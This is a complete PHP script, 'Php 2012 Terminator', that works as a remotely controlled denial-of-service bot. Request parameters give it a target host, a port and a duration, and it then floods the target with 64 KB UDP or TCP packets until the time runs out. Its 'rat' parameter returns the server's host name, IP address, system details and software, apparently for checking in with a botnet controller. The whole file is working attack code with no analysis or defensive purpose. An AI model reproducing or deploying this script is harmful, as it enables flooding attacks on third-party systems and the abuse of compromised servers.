<?php
set_time_limit(86400);
ignore_user_abort(True);
$packets = 0;
$http = $_REQUEST['http'];
$rand = $_REQUEST['exit'];
$exec_time = $_REQUEST['time'];
if (StrLen($http)==0 or StrLen($rand)==0 or StrLen($exec_time)==0)
{
if(StrLen($_REQUEST['rat'])<>0)
{
echo $_REQUEST['rat'].$_SERVER["HTTP_HOST"]."|".GetHostByName($_SERVER['SERVER_NAME'])."|".php_uname()."|".$_SERVER['SERVER_SOFTWARE'].$_REQUEST['rat'];
exit;
}
echo "Php 2012 Terminator";
exit;
}

for($i=0;$i<65535;$i++)
{
$out .= "X";
}
//Udp1-fsockopen Udp2 pfsockopen Tcp3 CC.center 
$max_time = time()+$exec_time;
if($rand==53)
while(1)
{
$packets++;
if(time() > $max_time)
{
break;
}
$fp = fsockopen("udp://$http", $rand, $errno, $errstr, 5);
if($fp)
{
fwrite($fp, $out);
fclose($fp);
}
}
else
if($rand==500)
while(1)
{
$packets++;
if(time() > $max_time){
break;
}
$fp = pfsockopen("udp://$http", $rand, $errno, $errstr, 5);
if($fp)
{
fwrite($fp, $out);
fclose($fp);
}
}
else
while(1)
{
$packets++;
if(time() > $max_time){
break;
}
$fp = pfsockopen("tcp://$http", $rand, $errno, $errstr, 5);
if($fp)
{
fwrite($fp, $out);
fclose($fp);
}
}
?>